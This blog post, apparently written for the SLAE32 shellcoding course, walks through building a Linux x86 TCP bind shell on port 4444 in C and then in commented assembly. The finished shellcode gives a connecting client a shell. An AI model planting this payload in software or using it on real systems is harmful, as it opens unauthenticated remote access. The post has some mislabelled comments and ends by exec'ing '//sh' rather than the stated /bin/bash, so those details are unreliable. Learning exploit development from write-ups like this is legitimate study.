---
title: SLAE32 Assignment 1 -- TCP Bind Shell Shellcode
date: 2019-9-15
layout: single
classes: wide
header:
  teaser: /assets/images/SLAE32.png
tags:
  - Bind
  - Shell
  - Assembly
  - Code
  - SLAE
  - Linux
  - x86
  - Shellcoding
  - Shellcode
--- 
![](/assets/images/SLAE32.png)
## Overview
For the first Assigment of the SLAE32 course, we were tasked with creating shellcode for a TCP bind shell.  

_What is shellcode?_   
Shellcode is executable code that can be injected into any program, that will preform a task.  

Since we need to create executable code that can be injected into a program, we will need to write this code in Assembly Language.  
+ Assembly Language is dependant on the processor it is executing on, and the operating system.
+ For this course all Assembly will be written for Intel 32-bit Architecture, and the Linux Operating System.

To map out how I was going to write Assembly Code for this assgnment, I first created a tcp bind shell using C.  
+ C is the closest programming language to Assembly.

Once I figured out which C functions I needed, I then had to figure out how to replace them with Linux System-Calls.  

#### Required C Funtions & Execution Flow
1. Create Socket.
  - `int ipv4Socket = socket(AF_INET, SOCK_STREAM, 0);`
2. Create IP-Socket Address.
  - `struct sockaddr_in ipSocketAddr = { .sin_family = AF_INET, .sin_port = htons(4444), .sin_addr.s_addr = htonl(INADDR_ANY) };`
3. Bind the IP-Socket Address to the Socket.
  - `bind(ipv4Socket, (struct sockaddr*) &ipSocketAddr, sizeof(ipSocketAddr));`
4. Listen for incoming connections on Socket at IP-Socket Address.
  - `listen(ipv4Socket, 0);`
5. Accept the incoming connection on the listening Socket and create a new, connected socket for client.
  - `int clientSocket = accept(ipv4Socket, NULL, NULL);`
6. Duplicate Standard Input, Standard Output, and Standard Error File-Descriptors to the newly created, connected Socket.
  - `dup2(clientSocket, 0); // STDIN`
  - `dup2(clientSocket, 1); // STDOUT`
  - `dup2(clientSocket, 2); // STDERR`
7. Spawn a bash shell for the client in the newly created, connected Socket that has Input, Output, and Error output.
  - `execve("/bin/bash", NULL, NULL);`  


## Creating a TCP Bind Shell in C
This is our C program to create a TCP Bind Shell.  

```c
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h> /* superset of previous */
#include <stdlib.h>

int main(void)
{
	int ipv4Socket = socket(AF_INET, SOCK_STREAM, 0);
	struct sockaddr_in ipSocketAddr = { .sin_family = AF_INET, .sin_port = htons(4444), .sin_addr.s_addr = htonl(INADDR_ANY) };
	bind(ipv4Socket, (struct sockaddr*) &ipSocketAddr, sizeof(ipSocketAddr)); 
	listen(ipv4Socket, 0);
	int clientSocket = accept(ipv4Socket, NULL, NULL);
	dup2(clientSocket, 0);
	dup2(clientSocket, 1);
	dup2(clientSocket, 2);
	execve("/bin/bash", NULL, NULL);
}	
```  

Great, now lets take a deeper dive into how to find all these function, and what they mean, using the linux manual (man) pages.   

### socket()
Our first function is `socket()`. We already know that this function is used to create a new socket. To find out more about this function we will use the command `man 7 socket` from our linux terminal.  
```console
man 7 socket
  int socket(int domain, int type, int protocol);
```
Our requirements for our bind shell is that at Layer 3 it uses the IP version 4 Protocol and that at Layer 4 it uses the Transmission Control Protocol (TCP).  
Reviewing the socket() man pages we discover we will need the following values/variables for our function:  
+ `int domain`   = `AF_INET`
  - IPv4 Internet protocols.
+ `int type`     = `SOCK_STREAM`      // 
  - Provides sequenced, reliable, two-way, connection-based byte streams (TCP).
+ `int protocol` = `0`                // 
  - The protocol to be used with the socket. Normally there is only one protocol per socket type. In this case the protocol value is 0.

Our C socket function will be:  
        `int ipv4Socket = socket(AF_INET, SOCK_STREAM, 0);`

### struct sockaddr\_in
Now that our IPv4-TCP Socket has been created, we will need to create an Address for it. Then bind the Address to the Socket.  
To create the IP Socket Address (IP + TCP Port Number), we will dig into it's man pages `man 7 ip`.  
We find this relevant information:

```c
An IP socket address is defined as a combination of an IP interface address and a 16-bit port number.
struct sockaddr_in {
          sa_family_t    sin_family; // address family: AF_INET
          in_port_t      sin_port;   // port in network byte order. See "man htons".
          struct in_addr sin_addr;   /* internet address */
 };
This is the struct for the internet address "in_addr" which is needed for the struct above "sockaddr_in".
struct in_addr {
     uint32_t       s_addr;     /* address in network byte order */
 };
```
From the above information, we know that we will need to use the Address Family `AF_INET`, then give it a port number (we will use TCP port 4444), and finally we will bind it to any/all interfaces using `INADDR_ANY`.  

The struct we will use is:  
`struct sockaddr_in ipSocketAddr = { .sin_family = AF_INET, .sin_port = htons(4444), .sin_addr.s_addr = htonl(INADDR_ANY) };`  
+ `man htons` - The `htons()` function converts an unsigned short integer hostshort from host byte order to network byte order.
+ `man htonl` - The `htonl()` function converts the unsigned integer hostlong from host byte order to network byte order.

### bind()
Now that we have a socket, a TCP port, and an IPv4 interface, we need to `bind` them all together.  
we will use the `bind()` C function to accomplish this, and dive into the man pages to discover the values/variables we will need, with the command `man 2 bind`.  
```c
int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);  
```
The first argument is `sockfd`, the socket file descriptor is the variable `ipv4Socket` we created earlier when creating the socket.  
The second argument `struct sockaddr \*addr`, is a pointer to the IPv4-TCP Socket address we created earlier `ipSocketAddr`.  
The final arguement is simply the byte length of our `ipSocketAddr` struct. We will fufill this using the C `sizeof()` function to do the work for us.  
Our bind function will be:   
       `bind(ipv4Socket, (struct sockaddr\*) &ipSocketAddr, sizeof(ipSocketAddr));`   

### listen()
Now that we have bound an address to our socket, we will need to configure it to be in the listening state. Allowing the socket to listen for incoming connections.   
To learn what we need to do we consult the manual page with `man 2 listen`.   
We find that the `listen()` function requires two arguments.  
`int listen(int sockfd, int backlog);`   
+ `sockfd` is simply our `ipv4Socket` variable. 
+ `backlog` is for handling multiple connections. 
  - We only need to handle one connection at a time, therefor we will set this value to `0`.   
Our C function will be:   
        `listen(ipv4Socket, 0);`  

### accept()
Now that our socket is listening we need to accept the incoming connections with the C function `accept()`.  
Consulting the manual page with `man 2 accept` we find that:  
+ the accept function takes the connection request from the listen function and creates a new connected socket.
+ `int accept(int sockfd, struct sockaddr \*addr, socklen_t \*addrlen);`
We will give our `accept()` function the variable name `clientSocket`. We will use our `ipv4Socket` variable we created earlier to fulfill the `int sockfd` arguments, and set the remaining two arguments to `NULL`.  
Our C function will be:   
        `int clientSocket = accept(ipv4Socket, NULL, NULL);`

### dup2()
Now that we have a tcp socket listening and accepting incoming connections, we will need to pass the input, output, and error messages from the program, to the connecting client. This will allow the connecting client to input text using their keyboard, and read the output that is returned.  
We will duplicate the File Descriptors for Standard Input(0), Standard Output(1), and Stadard Error(2) to the newly created, connected socket using the dup2() function three times. We will consult the man pages for more information will `man 2 dup2`.   
	`int dup2(int oldfd, int newfd);`
We find that the `dup2()` function requires 2 arguements. The first arguement `int oldfd` we be fufilled using the `clientSocket` variable we created earlier. The second arguement `int newfd` will be fufilled using the number value for STDIN(0), STDOUT(1), and STDERR(2) respectively.  
Our three dup2 functions will be:  
        `dup2(clientSocket, 0);`  
        `dup2(clientSocket, 1);`  
        `dup2(clientSocket, 2);`  

### execve()
At this point we have our program listening, and accepting connections from incoming clients. Once the client connects, the input and output of our program is passed over to the connecting client. The last thing we need to do is execute a program for our client to interact with.  
We will use the C function `execve()` to execute the shell `/bin/bash`.  
Consulting the manual pages with `man 2 execve` we find:  
```c
int execve(const char *filename, char *const argv[], char *const envp[]);
```
We discover that since we are not passing any additional options/flags/enviorment-settings to our `/bin/bash` program, we may set the arguments `argv[]` and `envp[]` to `NULL`. The first arguement `*filename` requires we give it the full path to our program `/bin/bash`.  
Our C function will be:  
       ` execve("/bin/bash", NULL, NULL);`

}

## Mapping System Calls to C Functions

Finding the System Call Number for Socket:  
```console
cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep "socket"`
 					`#define __NR_socketcall		102
```  
 At the Assembly level, System-Call 102 (socketcall), is used for these C functions:  
 `socket(), bind(), connect(), listen(), accept()` 
 
To differentiate between which function to call, a corresponding value is held in the EBX Register.  
These Values can be found with:  
```console
cat /usr/include/linux/net.h
	#define SYS_SOCKET      1               /* sys_socket(2)                */
	#define SYS_BIND        2               /* sys_bind(2)                  */
	#define SYS_CONNECT     3               /* sys_connect(2)               */
	#define SYS_LISTEN      4               /* sys_listen(2)                */
	#define SYS_ACCEPT      5               /* sys_accept(2)                */
```    
Like all System Calls Linux, they are triggered when the Assembly instruction "int 0x80" is executed.  
At the time of the interrupt 0x80, the value stored in the EAX register determines which system call is called.  
From above, we see the 5 C funtions we need all use the same system call at the Assembly level. 102 - "socketcall".  
Therefor for all functions, EAX will hold the value 102 (0x66 in Hex) everytime.  
The system call "socketcall" will know what to do (create a socket, listen, accept incoming connection, etc), 
based on the value stored in the EBX register.   
The arguments of the C level function will be stored, declared by the value in EBX, will be in an array.  
This array is nothing more than consecutive values of the arguments stored one after another in a memory space.;	The memory space we will use is the Stack. Since Stack Memory grows from high memory to low memory, we will
need to store this array of values in reverse order.  
Once we have pushed our array of consecutive arguments onto the stack (in reverse order), all we need to 
do is simply point the ECX register to the top of the stack.

## 1. Create a Socket
Default C Function:   `int socket(int domain, int type, int protocol);`  
Our C Function:       `int ipv4Socket = socket( AF_INET, SOCK_STREAM, 0 );`  
                            
EAX = 102 = 0x66 This is the value to call the SYSCAL "socketcall". We will use this for all the functions.   
EBX = 1 = 0x1    // Value for socket() function relative to the SYSCAL "socketcall".  
`#define SYS_SOCKET      1          // sys_socket(2)`  
ECX[0] = AF\_INET = 2 = 0x2   
Find value of AF\_INET:  
```console
cat /usr/include/i386-linux-gnu/bits/socket.h | grep AF_INET
    #define AF_INET         PF_INET    // We see that AF_INET is mapped to PF_INET
```		
Find value of PF\_INET: 
```console
cat /usr/include/i386-linux-gnu/bits/socket.h | grep PF_INET
	  #define PF_INET         2          // IP protocol family.
```  
ECX[1] = SOCK\_STREAM = 1 = 0x1   
Find value of SOCK\_STREAM: 
```console
cat /usr/src/linux-headers-$(uname -r)/include/linux/net.h | grep SOCK_STREAM
				SOCK_STREAM	= 1,
```  
ECX[2] = 0 = 0x0 // The value "0" is only option for the variable "int protocol"; for a TCP Socket.

```nasm
xor eax, eax      ; This sets the EAX Register to NULL (all zeros).
mov al, 0x66      ; EAX is now 0x00000066 = SYSCALL 102 - socketcall
xor ebx, ebx      ; This sets the EBX Register to NULL (all zeros).
mov bl, 0x1       ; EBX is set to create a socket
xor ecx, ecx      ; This sets the ECX Register to NULL (all zeros).
push ecx          ; ECX[2]. ECX is NULL, the value needed for the first
                  ;   argument we need to push onto the stack
push ebx          ; ECX[1]. EBX already has the value we need for ECX[1] 
                  ;   we will simply use it to push the value 1.
push dword 0x2    ; ECX[0]. Push the value 2 onto the stack, needed for AF_INET.
mov ecx, esp      ; ECX now holds the pointer to the beginning of the 
                  ;   argument array stored on the stack.
int 0x80          ; System Call Interrupt 0x80 - Executes socket(). 
                  ;   Creates the Socket.
xchg esi, eax     ; After the SYSCAL, sockfd is stored in the EAX Register. 
                  ;   Move it to the ESI Register; we will need it later.
```

## 2. Create IP-Socket Address and Bind the IP-Socket Address to the Socket.  
Default C Function:	`int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);`
Our C Function:	 
```c   
    bind(ipv4Socket, (struct sockaddr*) &ipSocketAddr, sizeof(ipSocketAddr));  
    EBX    ECX[0]                   ECX[1]                  ECX[2]
```   
       EAX = 102 = 0x66 // This is the value to call the SYSCAL "socketcall". We will use this for all the functions.   
       EBX = 2 = 0x2    // Value for socket() function relative to the SYSCAL "socketcall".  
			        #define SYS_BIND        2          // sys_bind(2)   
       ECX[0] = int sockfd = ESI 		// The Socket we created earlier and stored in the ESI register   
       ECX[1] = const struct sockaddr *addr 	// This will point to the Struct (array of variables) we will store onto the Stack.  
       ECX[2] = sizeof(ipSocketAddr)		// The Binary Length of the Struct we will store in ECX[1]  
 
This System Call is tricky because we will need to have an array within an array.  
  ECX[1] will point to the start of an array of 3 variables.   
   We will push these 3 variables onto the stack first, then we will push ECX[2], ECX[1], and finally ECX[0].  
 This is the struct we used in C to store the IP-Socket Address values used for the bind() function call:  

```c
struct sockaddr_in ipSocketAddr = { .sin_family = AF_INET, .sin_port = htons(4444), .sin_addr.s_addr = INADDR_ANY };
                                              ARG[0]               ARG[1]                          ARG[2]
```  

ARG[0] = AF\_INET = 0x2 			// We know this value from the last SYSCAL we did.  
	ARG[1] = htons(4444) =  0x5c11		// All this means is "4444" in Hex (0x115C), in reverse; since everything pushed to the Stack needs to be in reverse.  
	ARG[2] = INADDR_ANY = 0x00000000	// All Network Interfaces		
		Find value for INADDR_ANY: 
```console
 cat /usr/src/linux-headers-$(uname -r)/include/uapi/linux/in.h | grep INADDR_ANY  
				#define INADDR_ANY ((unsigned long int) 0x00000000)
```  
 The order to push all this on the stack will be:   
	ARG[2] > ARG[1] > ARG[0] > ECX[2] > ECX[1] > ECX[0]   

```nasm
xor eax, eax      ; This sets the EAX Register to NULL (all zeros).
mov al, 0x66      ; EAX is now 0x00000066 = SYSCALL 102 - socketcall
xor ebx, ebx      ; This sets the EBX Register to NULL (all zeros).
mov bl, 0x2       ; EBX is set to create a socket
xor edx, edx      ; This sets the EDX Register to NULL (all zeros).
push edx          ; ARG[2]. EDX is NULL, the value needed for INADDR_ANY.
push word 0x5c11  ; ARG[1]. This is for the TCP Port 4444.
push bx           ; ARG[0]. Push the value 2 onto the stack, needed for AF_INET.
xor ecx, ecx      ; This sets the EAX Register to NULL (all zeros).
mov ecx, esp      ; Save the memory location of ARG[0] into the EDX Register. We will use this for ECX[1].
push 0x10         ; ECX[2]. Our Struct of ARG's is now 16 bytes long (0x10 in Hex). 
push ecx          ; ECX[1]. The pointer to the beginning of the struct we saved is now loaded up for ECX[1].
push esi          ; ECX[0]. This is the value we saved from creating the Socket earlier. 
mov ecx, esp      ; Now all that is left is to point ECX to the top of the loaded stack and let it do it's thing.
int 0x80          ; System Call Interrupt 0x80 - Executes bind(). Connecting our Socket to the TCP-IP Address.
```

## 3. Listen for incoming connections on Socket at IP-Socket Address.  
Default C Function:	
```c
int listen(int sockfd, int backlog);    
```
Our C Function:	   
```c
listen( ipv4Socket, 0 );  
EBX      ECX[0]   ECX[1]  
```  
+ `EAX    = 102 = 0x66`
  - This is the value to call the SYSCAL `socketcall`.   
+ `EBX    = 4   = 0x4`
  - Value for `listen()` function relative to the SYSCAL `socketcall`.  
  - `#define SYS_LISTEN  4 // sys_listen(2)`
+ `ECX[0] = int sockfd = ESI`
  - The Socket we created earlier and stored in the `ESI` register.  
+ `ECX[1] = 0x0`
  - We have no need for a `backlog` so this value will be `0`.  

```nasm
xor eax, eax     ; This sets the EAX Register to NULL (all zeros).
mov al, 0x66     ; EAX is now 0x00000066 = SYSCALL 102 - socketcall
xor ebx, ebx     ; This sets the EBX Register to NULL (all zeros).
mov bl, 0x4      ; EBX is set to listen().
xor ecx, ecx     ; This sets the ECX Register to NULL (all zeros).
push ecx         ; ECX[1]. Push the value 0x0 to the stack.
push esi         ; ECX[0]. This is the value we saved from creating the Socket earlier. 
mov ecx, esp     ; Point ECX to the top of the stack. 
int 0x80         ; Executes listen(). Allowing us to handle incoming TCP-IP Connections.
```

## 4. Accept the incoming connection on the listening Socket and create a new, connected socket for client.  
    Default C Function: 	`int accept4(int sockfd, struct sockaddr *addr, socklen_t *addrlen, int flags);`  
    Our C Function:            
```c
int clientSocket = accept( ipv4Socket, NULL, NULL );
                    EBX     ECX[0]    ECX[1] ECX[2]
```
+ `EAX    = 102  = 0x66`
  - This is the value to call the SYSCAL `socketcall`.  
+ `EBX    = 5    = 0x5`
  - Value for `accept()` function relative to the SYSCAL `socketcall`.  
  - `#define SYS_ACCEPT      5         // sys_accept(2)`  
+ `ECX[0] = int sockfd = ESI`
  - The Socket we created earlier and stored in the ESI register  
+ `ECX[1] = NULL = 0x00000000`  
+ `ECX[2] = NULL = 0x00000000`  
       
```nasm
xor eax, eax     ; This sets the EAX Register to NULL (all zeros).
mov al, 0x66     ; EAX is now 0x00000066 = SYSCALL 102 - socketcall
xor ebx, ebx     ; This sets the EBX Register to NULL (all zeros).
mov bl, 0x5      ; EBX is set to accept().
xor ecx, ecx     ; This sets the ECX Register to NULL (all zeros).
push ecx         ; ECX[2]. Push the value 0x0 to the stack.
push ecx         ; ECX[1]. Push the value 0x0 to the stack.
push esi         ; ECX[0]. This is the value we saved from creating the Socket earlier. 
mov ecx, esp     ; Point ECX to the top of the stack. 
int 0x80         ; System Call Interrupt 0x80 - Executes accept(). Allowing us to create connected Sockets. 
xchg ebx, eax    ; The created clientSocket is stored in EAX after receiving a successful connection.
```

## 5. Duplicate Standard Input, Standard Output, and Standard Error File-Descriptors to the newly created, connected Socket.  
Default C Function:   
```c
int dup2(int oldfd, int newfd);  
```
Our C Function:            
```c
dup2( clientSocket, 0 ); // STDIN
dup2( clientSocket, 1 ); // STDOUT
dup2( clientSocket, 2 ); // STDERR
EAX       EBX      ECX     
```
+ `EAX = 63 = 0x3F`
  - This is the value to call the SYSCAL `dup2`.  
  - Find Dup2 SYSCAL value:  
```console
cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep dup2
  #define __NR_dup2                63
```   
+ EBX = int oldfd = clientSocket
  - Already set with `xchg ebx, eax` after the execution of `accept()`.  
+ ECX = 2 & 1 & 0 = 0x2 & 0x1 & 0x0
  - Since we need to do this SYSCAL 3 times, we will use a loop.  
```nasm  
  xor eax, eax     ; This sets the EAX Register to NULL (all zeros).
  xor ecx, ecx	   ; This sets the ECX Register to NULL (all zeros). 
  mov cl, 0x2	     ; This sets the loop counter & will also be the value of "int newfd" for the 3 dup2 SYSCAL's.
dup2Loop:		       ; Procedure label for the dup2 Loop.
  mov al, 0x3f     ; EAX is now 0x0000003F = SYSCALL 63 - dup2
  int 0x80         ; System Call Interrupt 0x80 - Executes accept(). Allowing us to create connected Sockets. 
  dec ecx		       ; Decrements ECX by 1 
  jns dup2Loop	   ; Jump back to the dup2Loop Procedure until ECX equals 0.
```  

## 6. Spawn a bash shell for the client in the newly created, connected Socket.
Default C Function:
```c
int execve(const char *filename, char *const argv[], char *const envp[]);
```  
Our C Function:
```c
execve("/bin/bash", NULL, NULL);
```
Execve SysCall: In the newly created socket, execute a shell. - See "man 2 execve" for full details.  
`int execve(const char *filename, char *const argv[], char *const envp[]);`  

Values in C program : execve("/bin/bash", NULL, NULL);  

+ `EAX = int execve() = 11`
  - System Call Number for `execve`  
```console
user$ cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep execve
  #define __NR_execve		 11	
```  
+ `EBX = const char *filename = address of string ("/bin/bash" + "0x00")`
  - Pointer to string in memory storing `/bin/bash` + `NULL` Terminated  
  - `NULL` Terminated ends the string `0x00`  
+ `ECX = char *const argv[] = [ memory address of string "/bin/bash", 0x00000000 ]`
  - Array of argument strings passed to the new program.  
  - #1 = Address of "/bin/bash" in memory  
  - #2 = DWORD (32bit) NULL = 0x00000000  
+ `EDX =  char *const envp[] = 0x00000000` 
  - Array of strings which are passed as environment to the new program.

```nasm
	push edx 	        ; NULL
	push 0x68732f2f	  ; "hs//"
	push 0x6e69622f   ; "nib/"
	mov ebx, esp	    ; point ebx to stack
	mov ecx, edx	    ; NULL
	mov al, 0xb	      ; execve System Call Number
	int 0x80	        ; execute execve
```
